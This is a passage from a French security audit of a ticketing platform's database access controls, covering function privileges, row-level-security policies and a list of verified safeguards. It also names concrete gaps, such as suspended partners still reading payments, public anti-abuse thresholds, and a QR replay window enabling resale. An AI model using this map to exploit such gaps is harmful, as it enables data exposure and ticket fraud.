| c | notif_ticket_categories_admin_alert() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_ticket_categories_admin_update_alert() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_ticket_categories_sold_out() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_tickets_first_sale() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notif_tickets_scanned() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notification_outbox_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | notification_outbox_set_updated_at() | oui | VOLATILE | search_path=public | non | non | oui |
| c | participant_exports_append_only() | oui | VOLATILE | search_path=public | non | non | oui |
| c | partner_controllers_link() | oui | VOLATILE | search_path=public | non | non | oui |
| c | payments_simulated_set() | oui | VOLATILE | search_path=public | non | non | oui |
| c | payments_simulation_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | platform_settings_audit() | oui | VOLATILE | search_path=public | non | non | oui |
| c | scan_refusal_alert() | oui | VOLATILE | search_path=public | non | non | oui |
| c | set_referral_code_on_insert() | non | VOLATILE | search_path=public, extensions | non | non | oui |
| c | stock_reservations_sale_online_set() | oui | VOLATILE | search_path=public | non | non | oui |
| c | stock_reservations_sync_held() | oui | VOLATILE | search_path=public | non | non | oui |
| c | sync_user_roles_to_jwt() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_categories_channels_sync() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_categories_min_price_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_categories_public_summary_sync() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_scans_enrich() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_secret_rotate_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_secret_version_issue() | oui | VOLATILE | search_path=public | non | non | oui |
| c | ticket_secret_version_log() | oui | VOLATILE | search_path=public | non | non | oui |
| c | tickets_sale_decision_guard() | oui | VOLATILE | search_path=public | non | non | oui |
| c | tickets_sale_decision_set() | oui | VOLATILE | search_path=public | non | non | oui |
| c | tickets_touch_updated_at() | non | VOLATILE | search_path=public | non | non | oui |
| c | trg_fn_payment_success_commissions() | oui | VOLATILE | search_path=public, extensions | non | non | oui |
| c | zone_categories_default_admit() | oui | VOLATILE | search_path=public | non | non | oui |

Récapitulatif (groupe, EXECUTE anon, EXECUTE authenticated) : a/oui/oui = 7 ; b/non/non = 216 ; c/non/non = 66


Autres schémas exposés ou sensibles (catalogue de la branche, `tests/audit/aud-00-catalogue.test.ts`) : fonctions exécutables par anon ou authenticated, hors public :

- `graphql_public` : 1 fonction(s), dont 0 SECURITY DEFINER.
- `realtime` : 18 fonction(s), dont 0 SECURITY DEFINER.
- `storage` : 20 fonction(s), dont 0 SECURITY DEFINER.

---

## 3. Tableau 2 — lectures directes (REST `/rest/v1`, Realtime) par relation

| Relation | Type · RLS | SELECT anon / authenticated | Colonnes masquées à authenticated | Politiques SELECT | Realtime | Lignes visibles (total · anon · CLIENT · PARTNER_A · CONTROLLER_A · ADMIN · SUSPENDED) |
|---|---|---|---|---|---|---|
| `admin_permissions` | table · oui | oui / oui | — | `admin_permissions_admin_read_own` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `admin_signals` | table · oui | non / oui | — | `admin_signals_admin_read` ({authenticated}) | oui (d) | 6 · refus · 0 · 0 · 0 · 6 · 0 |
| `audit_logs` | table · oui | oui / oui | — | `audit_logs_superadmin_read` ({public}) | non | 43 · 0 · 0 · 0 · 0 · 0 · 0 |
| `campaigns` | table · oui | oui / oui | — | aucune | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `cashouts` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `controller_invitations` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `controller_shifts` | table · oui | oui / oui | — | `controller_shifts_admin_select` ({authenticated})<br>`controller_shifts_controller_select` ({authenticated})<br>`controller_shifts_partner_select` ({authenticated}) | oui (d) | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `email_verifications` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `event_cancellations` | table · oui | oui / oui | — | `event_cancellations_select` ({authenticated}) | non | 1 · 0 · 0 · 0 · 0 · 1 · 0 |
| `event_cash_refund_marks` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `event_controllers` | table · oui | oui / oui | — | `ec_select_by_controller` ({authenticated})<br>`ec_select_by_creator` ({authenticated}) | non | 1 · 0 · 0 · 1 · 1 · 0 · 0 |
| `event_gates` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `event_regisseur_pins` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `event_start_changes` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `event_status_history` | table · oui | non / oui | — | `event_status_history_read` ({authenticated}) | oui (d) | 19 · refus · 0 · 10 · 0 · 19 · 0 |
| `event_status_transitions` | table · oui | non / oui | — | `event_status_transitions_read` ({authenticated}) | non | 17 · refus · 17 · 17 · 17 · 17 · 17 |
| `event_zones` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `events` | table · oui | oui / oui | — | `events_read_public` ({public}) | non | 5 · 4 · 4 · 5 · 4 · 5 · 4 |
| `events_public_status` | vue · non | oui / oui | — | aucune | non | 4 · 4 · 4 · 4 · 4 · 4 · 4 |
| `finance_debts` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `finance_ledger` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `hall_reservations` | table · oui | oui / oui | — | `hall_reservations_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `halls` | table · oui | oui / oui | — | `halls_read_public` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `notification_outbox` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `notification_preferences` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `notification_types` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `notifications` | table · oui | oui / oui | — | `notifications_read_own` ({authenticated}) | oui (f) | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `order_items` | table · oui | oui / oui | — | `order_items_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `orders` | table · oui | oui / oui | — | `orders_read` ({authenticated}) | oui (f) | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `otp_codes` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `participant_exports` | table · oui | non / oui | — | `participant_exports_owner_admin_select` ({authenticated}) | non | 0 · refus · 0 · 0 · 0 · 0 · 0 |
| `partner_activities` | table · oui | oui / oui | — | `partner_activities_read` ({public}) | non | 2 · 2 · 2 · 2 · 2 · 2 · 2 |
| `partner_controllers` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `partner_document_uploads` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `partner_suspension_cascades` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `partners` | table · oui | oui / oui | — | `partners_select_owner_admin` ({public}) | non | 2 · 0 · 0 · 1 · 0 · 2 · 0 |
| `password_confirmations` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `payment_webhook_events` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `payments` | table · oui | oui / oui | — | `payments_read` ({public}) | non | 2 · 0 · 1 · 0 · 0 · 2 · 0 |
| `platform_settings` | table · oui | oui / oui | — | `platform_settings_read` ({public}) | non | 42 · 42 · 42 · 42 · 42 · 42 · 42 |
| `platform_settings_history` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `product_categories` | table · oui | oui / oui | — | `product_categories_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `products` | table · oui | oui / oui | — | `products_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `public_category_stock` | table · oui | oui / oui | — | `public_category_stock_read` ({anon,authenticated}) | oui (d) | 5 · 5 · 5 · 5 · 5 · 5 · 5 |
| `public_event_state` | table · oui | oui / oui | — | `public_event_state_read` ({anon,authenticated}) | oui (d) | 4 · 4 · 4 · 4 · 4 · 4 · 4 |
| `public_partners` | vue · non | oui / oui | — | aucune | non | 2 · 2 · 2 · 2 · 2 · 2 · 2 |
| `push_subscriptions` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `quota_counters` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `referral_commission_payouts` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `referral_commissions` | table · oui | oui / oui | — | `referral_commissions_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `referral_config` | table · oui | oui / oui | — | `referral_config_read` ({public}) | non | 4 · 4 · 4 · 4 · 4 · 4 · 4 |
| `referral_relationships` | table · oui | oui / oui | — | `referral_relationships_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `refunds` | table · oui | oui / oui | — | `refunds_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `restaurant_tables` | table · oui | oui / oui | — | `restaurant_tables_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `restaurant_zones` | table · oui | oui / oui | — | `restaurant_zones_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `scan_incidents` | table · oui | non / oui | — | `scan_incidents_owner_admin_select` ({authenticated}) | oui (d) | 0 · refus · 0 · 0 · 0 · 0 · 0 |
| `sponsored_promotions` | table · oui | oui / oui | — | `Partners see own promotions` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `stock_reservations` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `subscription_plans` | table · oui | oui / oui | — | `subscription_plans_read_active` ({public}) | non | 3 · 3 · 3 · 3 · 3 · 3 · 3 |
| `table_reservations` | table · oui | oui / oui | — | `table_reservations_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `ticket_categories` | table · oui | colonnes / colonnes | sold_quantity,held_quantity,scan_color,entry_instruction | `ticket_categories_read_public` ({public}) | oui (f) | 6 · 5 · 5 · 6 · 5 · 6 · 5 |
| `ticket_offline_downloads` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `ticket_scans` | table · oui | non / oui | — | `ticket_scans_owner_admin_select` ({authenticated}) | oui (d) | 0 · refus · 0 · 0 · 0 · 0 · 0 |
| `ticket_secret_versions` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |
| `ticket_transfers` | table · oui | oui / oui | — | `ticket_transfers_select` ({authenticated}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `tickets` | table · oui | non / colonnes | qr_code,totp_secret,sale_decision,guest_name | `tickets_read` ({authenticated}) | oui (f) | 2 · refus · 1 · 1 · 1 · 2 · 0 |
| `user_roles` | table · oui | oui / oui | — | `user_roles_select_own` ({authenticated}) | non | 13 · 0 · 1 · 2 · 2 · 13 · 1 |
| `users` | table · oui | oui / oui | — | `users_select_policy` ({public}) | non | 8 · 0 · 1 · 1 · 1 · 8 · 1 |
| `withdrawals` | table · oui | oui / oui | — | `withdrawals_read` ({public}) | non | 0 · 0 · 0 · 0 · 0 · 0 · 0 |
| `zone_categories` | table · oui | non / non | toutes | aucune | non | non lisible (aucun droit SELECT) |

#### Clauses complètes des politiques de lecture (catalogue)

| Relation | Politique | Rôles | USING |
|---|---|---|---|
| `public.admin_permissions` | `admin_permissions_admin_read_own` | {public} | `(user_id = auth.uid())` |
| `public.admin_signals` | `admin_signals_admin_read` | {authenticated} | `(is_admin() AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.audit_logs` | `audit_logs_superadmin_read` | {public} | `is_superadmin()` |
| `public.controller_shifts` | `controller_shifts_admin_select` | {authenticated} | `(is_admin() AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.controller_shifts` | `controller_shifts_controller_select` | {authenticated} | `((auth.uid() = controller_id) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.controller_shifts` | `controller_shifts_partner_select` | {authenticated} | `((EXISTS ( SELECT 1 FROM partners p WHERE ((p.id = controller_shifts.partner_id) AND (p.user_id = auth.uid())))) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.event_cancellations` | `event_cancellations_select` | {authenticated} | `((EXISTS ( SELECT 1 FROM events e WHERE ((e.id = event_cancellations.event_id) AND is_partner_owner(e.partner_id)))) OR is_admin())` |
| `public.event_controllers` | `ec_select_by_controller` | {authenticated} | `(user_id = auth.uid())` |
| `public.event_controllers` | `ec_select_by_creator` | {authenticated} | `(created_by = auth.uid())` |
| `public.event_status_history` | `event_status_history_read` | {authenticated} | `(((EXISTS ( SELECT 1 FROM events e WHERE ((e.id = event_status_history.event_id) AND is_partner_owner(e.partner_id)))) OR is_admin()) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.event_status_transitions` | `event_status_transitions_read` | {authenticated} | `true` |
| `public.events` | `events_read_public` | {public} | `(((status = ANY (ARRAY['PUBLIE'::event_status, 'SUSPENDU'::event_status, 'ANNULE'::event_status, 'TERMINE'::event_status])) AND (NOT ended_unpublished)) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.hall_reservations` | `hall_reservations_read` | {public} | `((client_id = auth.uid()) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.halls` | `halls_read_public` | {public} | `((is_active = true) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.notifications` | `notifications_read_own` | {authenticated} | `((user_id = auth.uid()) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.order_items` | `order_items_read` | {public} | `(EXISTS ( SELECT 1 FROM orders WHERE ((orders.id = order_items.order_id) AND ((orders.client_id = auth.uid()) OR is_partner_owner(orders.partner_id) OR is_admin()))))` |
| `public.orders` | `orders_read` | {authenticated} | `(((client_id = auth.uid()) OR is_partner_owner(partner_id) OR is_admin()) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.participant_exports` | `participant_exports_owner_admin_select` | {authenticated} | `(is_admin() OR (EXISTS ( SELECT 1 FROM events e WHERE ((e.id = participant_exports.event_id) AND is_partner_owner(e.partner_id)))))` |
| `public.partner_activities` | `partner_activities_read` | {public} | `((is_active = true) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.partners` | `partners_select_owner_admin` | {public} | `((user_id = auth.uid()) OR is_admin())` |
| `public.payments` | `payments_read` | {public} | `((client_id = auth.uid()) OR ((partner_id IS NOT NULL) AND is_partner_owner(partner_id)) OR is_admin())` |
| `public.platform_settings` | `platform_settings_read` | {public} | `true` |
| `public.product_categories` | `product_categories_read` | {public} | `((is_active = true) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.products` | `products_read` | {public} | `((status = 'DISPONIBLE'::product_status) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.public_category_stock` | `public_category_stock_read` | {anon,authenticated} | `true` |
| `public.public_event_state` | `public_event_state_read` | {anon,authenticated} | `true` |
| `public.referral_commissions` | `referral_commissions_read` | {public} | `((sponsor_id = auth.uid()) OR is_admin())` |
| `public.referral_config` | `referral_config_read` | {public} | `((is_active = true) OR is_admin())` |
| `public.referral_relationships` | `referral_relationships_read` | {public} | `((sponsor_id = auth.uid()) OR (referred_id = auth.uid()) OR is_admin())` |
| `public.refunds` | `refunds_read` | {public} | `((EXISTS ( SELECT 1 FROM payments WHERE ((payments.id = refunds.payment_id) AND ((payments.client_id = auth.uid()) OR ((payments.partner_id IS NOT NULL) AND is_partner_owner(payments.partner_id)))))) OR is_admin())` |
| `public.restaurant_tables` | `restaurant_tables_read` | {public} | `((is_active = true) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.restaurant_zones` | `restaurant_zones_read` | {public} | `((is_active = true) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.scan_incidents` | `scan_incidents_owner_admin_select` | {authenticated} | `((is_admin() OR (EXISTS ( SELECT 1 FROM (events e JOIN partners pa ON ((pa.id = e.partner_id))) WHERE ((e.id = scan_incidents.event_id) AND (pa.user_id = auth.uid()))))) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.sponsored_promotions` | `Partners see own promotions` | {public} | `(partner_id IN ( SELECT partners.id FROM partners WHERE (partners.user_id = auth.uid())))` |
| `public.subscription_plans` | `subscription_plans_read_active` | {public} | `((is_active = true) OR is_admin())` |
| `public.table_reservations` | `table_reservations_read` | {public} | `((client_id = auth.uid()) OR is_partner_owner(partner_id) OR is_admin())` |
| `public.ticket_categories` | `ticket_categories_read_public` | {public} | `((is_active AND sale_online AND (EXISTS ( SELECT 1 FROM events_public_status s WHERE (s.id = ticket_categories.event_id)))) OR ticket_category_private_read(event_id))` |
| `public.ticket_scans` | `ticket_scans_owner_admin_select` | {authenticated} | `((is_admin() OR (EXISTS ( SELECT 1 FROM (events e JOIN partners p ON ((p.id = e.partner_id))) WHERE ((e.id = ticket_scans.event_id) AND (p.user_id = auth.uid()))))) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.ticket_transfers` | `ticket_transfers_select` | {authenticated} | `((from_user_id = auth.uid()) OR (to_user_id = auth.uid()) OR is_admin())` |
| `public.tickets` | `tickets_read` | {authenticated} | `(((user_id = auth.uid()) OR (EXISTS ( SELECT 1 FROM events e WHERE ((e.id = tickets.event_id) AND is_partner_owner(e.partner_id)))) OR is_admin() OR (is_controller() AND (EXISTS ( SELECT 1 FROM event_controllers ec WHERE ((ec.event_id = tickets.event_id) AND (ec.user_id = auth.uid())))))) AND (EXISTS ( SELECT 1 FROM users u WHERE ((u.id = auth.uid()) AND ((u.status)::text <> ALL (ARRAY['SUSPENDU'::text, 'SUPPRIME'::text]))))))` |
| `public.user_roles` | `user_roles_select_own` | {authenticated} | `((user_id = auth.uid()) OR is_admin())` |
| `public.users` | `users_select_policy` | {public} | `((id = ( SELECT auth.uid() AS uid)) OR ( SELECT is_admin() AS is_admin))` |
| `public.withdrawals` | `withdrawals_read` | {public} | `((user_id = auth.uid()) OR is_admin())` |
| `storage.objects` | `partner_documents_select_own_or_admin` | {public} | `((bucket_id = 'partner_documents'::text) AND (((auth.role() = 'authenticated'::text) AND ((storage.foldername(name))[1] = (auth.uid())::text)) OR is_admin()))` |

Politiques d'écriture : 0.

#### Vues

- `events_public_status` : propriétaire `postgres`, options `{security_barrier=true}` ; définition : ` SELECT id, status FROM events e WHERE (status::text = ANY (ARRAY['PUBLIE'::text, 'SUSPENDU'::text, 'ANNULE'::text, 'TERMINE'::text])) AND NOT ended_unpublished;`
- `public_partners` : propriétaire `postgres`, options `{security_barrier=true}` ; définition : ` SELECT id, company_name, logo_url, city, description, status FROM partners p WHERE status = 'VALIDE'::partner_status;`

#### Stockage

- bucket `avatars` : public = True, taille maximale = 2097152, types = {image/webp}
- bucket `partner_documents` : public = False, taille maximale = 10485760, types = {image/jpeg,image/png,image/webp,application/pdf}
- bucket `public-images` : public = True, taille maximale = 5242880, types = {image/jpeg,image/png,image/webp}

#### Publication temps réel

`public.admin_signals` (replica identity d), `public.controller_shifts` (replica identity d), `public.event_status_history` (replica identity d), `public.notifications` (replica identity f), `public.orders` (replica identity f), `public.public_category_stock` (replica identity d), `public.public_event_state` (replica identity d), `public.scan_incidents` (replica identity d), `public.ticket_categories` (replica identity f), `public.ticket_scans` (replica identity d), `public.tickets` (replica identity f)

#### Verdict : qui lit les données d'autrui ?

Les données viennent du catalogue réel (suite `aud-00`). Les comptes de mesure sont issus du seed : un visiteur, un
client, une partenaire, un contrôleur, un admin et un compte suspendu.

**Ce qui est sain**

- **Comptes** (`users`, `user_roles`) : chaque compte ne lit que sa propre ligne ; un admin ACTIF lit tout ; un
  visiteur ne lit rien (lignes visibles : 0 pour le visiteur, 1 pour chaque compte, toutes pour l'admin).
- **Pièces d'identité et documents** : rien en base lisible (`partner_document_uploads` n'a aucune politique). Le
  stockage est privé : dossier propre ou admin ACTIF.
- **Codes, PIN, secrets** (`otp_codes`, `event_regisseur_pins`, `ticket_secret_versions`, `password_confirmations`,
  `email_verifications`) : aucune politique, donc illisibles.
- **Billets** (`tickets`) : droits par colonne, sans `totp_secret`, `qr_code` ni `guest_name`. Un compte lit ses
  propres billets ; la partenaire propriétaire, l'admin ACTIF ou le contrôleur affecté lisent ceux de l'événement. Un
  compte SUSPENDU ou SUPPRIME est exclu par la clause de statut de la politique.
- **Scans, incidents, caisses** (`ticket_scans`, `scan_incidents`, `controller_shifts`) : propriétaire ou admin, compte
  non suspendu.
- **Retraits** (`withdrawals`) : propriétaire ou admin.
- **Transferts** (`ticket_transfers`) : émetteur, destinataire ou admin.
- **Parrainage** (`referral_*`) : parrain, filleul ou admin.
- **Vues publiques** (`events_public_status`, `public_partners`) : elles ne publient que des colonnes non personnelles
  (identifiant, statut, raison sociale, logo, ville, description) des événements visibles et des partenaires validés.
  Leur propriétaire `postgres` contourne la RLS, mais le filtre est dans la définition (`security_barrier`).

**Les écarts**

- **Paiements** (`payments`) : un client lit ses paiements ; la partenaire lit ceux de ses événements, numéro du payeur
  compris. C'est voulu, mais sans test de statut : le partenaire suspendu continue de les lire (**AUD-06**).
- **Remboursements, annulations, exports, brouillons** : même dépendance à `is_partner_owner` sans statut (**AUD-06**).
- **Réglages** (`platform_settings`) : lisibles par tout le monde (`0007_superadmin_complete.sql:109-110`,
  `USING (TRUE)`), 42 lignes sans secret, mais qui livrent les seuils anti-abus (**AUD-40**).

**Temps réel.** Les tables de la publication (liste ci-dessus) sont soumises aux mêmes politiques. Aucune table n'y
expose davantage que par REST.

---

## 4. Vérifié et trouvé sain

Chaque point a été lu dans le code de `main`. Les lignes marquées **(L)** viennent des lectures parallèles ; leurs
références ont été relues par échantillon (au moins une par ligne), pas toutes.

| Domaine | Vérification | Preuve |
|---|---|---|
| Fonctions SQL | 282 fonctions de `public` exécutables par `service_role` seul ; 7 aides RLS seulement pour `anon`/`authenticated`, en lecture seule, `search_path` fixé ; aucune fonction SECURITY DEFINER métier appelable par `/rest/v1/rpc` | Tableau 1 ; `tests/schema/fonctions-privileges.test.ts` vert |
| Écritures REST | Aucun droit ni aucune politique INSERT/UPDATE/DELETE/TRUNCATE pour `anon`/`authenticated` sur les 70 relations de `public` ; garde finale de migration | journal `tests/schema/rls-ecritures` (run 136 et run de la branche) ; `20261110000001_lot9ter_rls.sql` |
| Lectures sensibles | `otp_codes`, `password_confirmations`, `email_verifications`, `event_regisseur_pins`, `ticket_secret_versions`, `notification_outbox`, `push_subscriptions`, `cashouts`, `finance_ledger`, `payment_webhook_events`, `quota_counters` : aucune politique, donc illisibles par REST ; `users` : sa propre ligne ou admin ACTIF | Tableau 2 |
| Webhook SamirPay | Jeton propre au paiement dans le `callBackUrl`, haché, comparé à temps constant ; corrélation avec l'identifiant enregistré ; statut relu chez SamirPay avant toute confirmation ; signature HMAC v1.2 à temps constant, fenêtre de 300 s, quand le secret est défini (seul défaut : AUD-04) | `lib/payments/webhook.service.ts:98-127` ; `lib/samirpay/webhook-signature.ts:37-61` |
| Montant payé | Jamais fourni par le client : relu en base et calculé par le serveur | `app/api/payments/create/route.ts:21-25` ; `lib/payments/payment.service.ts:27-31` ; `lib/payments/checkout.service.ts:218-262` (contrôles `ticket_sale_problems` puis `checkout_create_payment`) |
| Tâches planifiées | Chaque route `app/api/cron/*` appelle `refuseUnlessCron` : `CRON_SECRET` obligatoire (503 s'il manque), comparaison d'empreintes à temps constant | `lib/security/cron-auth.ts:14-25` ; inventaire des routes (aucune route cron sans garde) |
| Administration | `verifyAdminAuth` : compte ACTIF exigé, rôles lus dans `user_roles` seulement, permission précise par route ou SUPERADMIN ; la route de statut partenaire vérifie la permission après lecture du statut demandé | `lib/admin/admin-auth.ts:86-200` ; `app/api/admin/partners/[id]/status/route.ts:72-77` |
| Hook SMS de GoTrue | Signature Standard Webhooks (± 5 min) ou secret complet en Bearer à temps constant ; refus 503 si le secret manque | `app/api/auth/sms-hook/route.ts:26-51` |
| Stockage | `partner_documents` privé (10 Mo, PDF/JPEG/PNG/WebP), lecture du dossier propre ou admin ACTIF, aucune politique d'écriture (dépôts par le serveur, type lu dans la signature du fichier, chemin aléatoire) ; `avatars` et `public-images` publics en lecture par URL, sans politique d'écriture ni de listage | `0005_storage_and_auth.sql:31-64` ; `20261031000007_lot1c2_documents_inscription.sql:43-46` ; `20261102000004_lot5_edition.sql:40-45` ; `20261108000004_lot9_compte.sql:34-43` ; `app/api/partner/documents/upload/route.ts:13-22` |
| Temps réel | Le code ne s'abonne qu'à `postgres_changes` (RLS appliquée par Realtime), aucun canal broadcast/presence ; `payments` retirée de la publication | `hooks/useRealtimeRefresh.ts:107`, `hooks/usePartnerOrders.ts:64`, `app/controller/scanner/page.tsx:575`, `app/partner/orders/page.tsx:148` ; `20261102000001_lot5_securite.sql:102` ; publication : tableau 2 |
| QR dynamique | Clé du billet = HMAC(clé maître hors base, id + secret du billet), pas de 20 s, ± 1 pas, comparaison à temps constant ; secret régénéré au transfert ; le contrôleur ne reçoit jamais de secret | `lib/security/totp.ts:1-60` ; `app/api/controller/scan/route.ts:185-189` |
| Billet PDF | Aucun QR imprimé ; téléchargement réservé au porteur actuel ou à un admin | `lib/tickets/ticket-pdf.service.ts:2`, `:192` ; `app/api/tickets/[id]/pdf/route.ts:52-53` |
| Droit de scanner | Compte ACTIF ET (contrôleur affecté à l'événement, ou propriétaire, ou admin) ; retirer un contrôleur supprime son affectation | `20261101000010_lot4_scan.sql:60-71` ; `20261110000006_lot9ter_equipe_messages.sql:557` |
| Activation d'un contrôleur | Code SMS vérifié et consommé avant tout, quota par numéro, compte ACTIF et invitation exigés, mot de passe existant jamais écrasé | `app/api/controller/setup/route.ts:45-133` |
| Retraits | Code SMS d'objet WITHDRAWAL envoyé au numéro du compte ; solde, gel et blocage de 24 h après un changement de numéro contrôlés en base | `app/api/withdrawals/request/route.ts:80-88` ; `20261110000005_lot9ter_argent.sql:366-391` |
| Changement de numéro, transfert | Mot de passe saisi depuis moins de 10 minutes ; SMS `PHONE_CHANGED` à l'ancien numéro ; réponse du transfert identique que le destinataire ait un compte ou non | `app/api/account/phone/start/route.ts:33` ; `20261109000004_lot9bis_droits.sql:843-853` ; `app/api/tickets/[id]/transfer/route.ts:32` ; `lib/tickets/ticket-transfer.service.ts:204-217` |
| Transfert de billet | L'acceptation change le numéro, le QR et le secret et avance la version sous verrou : codes hors ligne et numéro du PDF de l'ancien porteur ne valent plus rien ; un transfert en attente bloque scan, code en direct, lot hors ligne et PDF ; transfert vers soi-même refusé ; accepter, annuler et scanner sérialisés par les verrous du transfert et du billet | `20261105000003_lot7_securite.sql:379`, `:388-396` ; `20261105000004_lot7_billet_hors_ligne.sql:100-115` ; `20261110000008_lot9ter_invites.sql:561` ; `20261109000008_lot9bis_cycle.sql:1439`, `:2528` ; `20261110000009_lot9ter_zones.sql:1092` |
| Une entrée par billet | Deux scans simultanés du même QR à deux portes : un seul `valid` (index unique) ; billet d'un autre événement ou d'une catégorie non admise refusé ; un invité n'entre pas deux fois. Limite connue : une capture du QR vaut 40 s et un lot hors ligne couvre 48 h, d'où une revente multiple possible dont seul le premier acheteur entre | `20261101000010_lot4_scan.sql:51` ; `20261110000009_lot9ter_zones.sql:1097`, `:1234-1249` ; `lib/security/totp.ts:61-84` |
| Invitations, saisie manuelle | `tickets/claim/[token]` retiré (410 sans lecture de la base) ; numéros de billet `TCK-<date>-<10 hexadécimaux aléatoires>` (40 bits), saisie manuelle soumise au quota de scan (30 par 10 s et par scanneur), au périmètre réglé et à la pièce vérifiée | `app/api/tickets/claim/[token]/route.ts:19-35` ; `20261110000009_lot9ter_zones.sql:1064-1075`, `:1603` ; `app/api/controller/scan/route.ts:149` |
| Guichet | Vendeur affecté, permission espèces relue à chaque vente, caisse ouverte avec PIN ; encaissement, total attendu et billets écrits dans la même transaction ; idempotence par clé unique | `20261110000009_lot9ter_zones.sql:1478-1619` |
